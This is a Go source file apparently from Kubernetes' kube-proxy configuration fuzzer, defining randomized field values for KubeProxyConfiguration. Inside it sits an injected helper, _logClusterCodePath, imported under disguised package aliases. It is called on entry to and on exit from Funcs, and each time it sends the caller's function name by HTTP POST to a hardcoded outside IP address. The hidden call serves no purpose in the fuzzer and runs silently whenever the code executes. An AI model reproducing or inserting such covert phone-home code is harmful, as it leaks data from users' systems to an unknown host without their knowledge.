package fuzzer

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "github.com/google/gofuzz"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 kubeproxyconfig "k8s.io/kubernetes/pkg/proxy/apis/config"
 utilpointer "k8s.io/utils/pointer"
)

func Funcs(codecs runtimeserializer.CodecFactory) []interface{} {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []interface{}{func(obj *kubeproxyconfig.KubeProxyConfiguration, c fuzz.Continue) {
  c.FuzzNoCustom(obj)
  obj.BindAddress = fmt.Sprintf("%d.%d.%d.%d", c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(256))
  obj.ClientConnection.ContentType = c.RandString()
  obj.Conntrack.MaxPerCore = utilpointer.Int32Ptr(c.Int31())
  obj.Conntrack.Min = utilpointer.Int32Ptr(c.Int31())
  obj.Conntrack.TCPCloseWaitTimeout = &metav1.Duration{Duration: time.Duration(c.Int63()) * time.Hour}
  obj.Conntrack.TCPEstablishedTimeout = &metav1.Duration{Duration: time.Duration(c.Int63()) * time.Hour}
  obj.FeatureGates = map[string]bool{c.RandString(): true}
  obj.HealthzBindAddress = fmt.Sprintf("%d.%d.%d.%d:%d", c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(65536))
  obj.IPTables.MasqueradeBit = utilpointer.Int32Ptr(c.Int31())
  obj.MetricsBindAddress = fmt.Sprintf("%d.%d.%d.%d:%d", c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(256), c.Intn(65536))
  obj.OOMScoreAdj = utilpointer.Int32Ptr(c.Int31())
  obj.ResourceContainer = "foo"
  obj.ClientConnection.ContentType = "bar"
  obj.NodePortAddresses = []string{"1.2.3.0/24"}
 }}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
